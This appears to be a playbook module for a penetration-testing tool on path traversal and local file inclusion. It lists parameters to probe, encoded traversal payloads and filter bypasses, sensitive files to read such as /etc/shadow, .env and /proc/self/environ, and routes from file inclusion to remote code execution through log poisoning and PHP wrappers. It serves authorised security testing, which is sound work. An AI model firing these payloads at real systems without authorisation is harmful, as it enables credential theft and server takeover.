---
name: path-traversal
category: file_access
description: Path traversal and local file inclusion testing
attack_types:
  - path_traversal
  - lfi
  - file_access
severity_range: [medium, critical]
---

# Path Traversal & Local File Inclusion

## Phase 1: Identify File Parameters
- Direct: `file=`, `path=`, `page=`, `template=`, `include=`, `doc=`, `img=`
- Indirect: `lang=`, `locale=`, `theme=`, `style=`, `layout=`
- Download: `download=`, `export=`, `attachment=`

## Phase 2: Basic Traversal
```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd  (double encoding)
```

## Phase 3: Bypass Techniques
- Null byte (legacy): `../../../etc/passwd%00.jpg`
- Path truncation: Long path exceeding OS limit
- Double encoding: `%252e%252e%252f`
- UTF-8 encoding: `%c0%ae%c0%ae%c0%af`
- Backslash on Windows: `..\..\..\windows\win.ini`
- Mixed separators: `..\/..\/etc/passwd`
- Dot stripping bypass: `....//....//etc/passwd`

## Phase 4: Target Files
### Linux
- `/etc/passwd`, `/etc/shadow`, `/etc/hosts`
- `/proc/self/environ`, `/proc/self/cmdline`
- `/var/log/apache2/access.log`, `/var/log/auth.log`
- Application configs: `.env`, `config.php`, `web.config`

### Windows
- `C:\windows\win.ini`, `C:\windows\system32\drivers\etc\hosts`
- `C:\inetpub\wwwroot\web.config`
- `C:\Users\<user>\Desktop\`, `C:\boot.ini`

## Phase 5: LFI to RCE
- Log poisoning: Inject PHP in User-Agent → include access.log
- PHP wrappers: `php://filter/convert.base64-encode/resource=`
- Data wrapper: `data://text/plain;base64,`
- Proc environ: Inject via User-Agent → include `/proc/self/environ`
- Session files: `/tmp/sess_<sessionid>` with controlled content
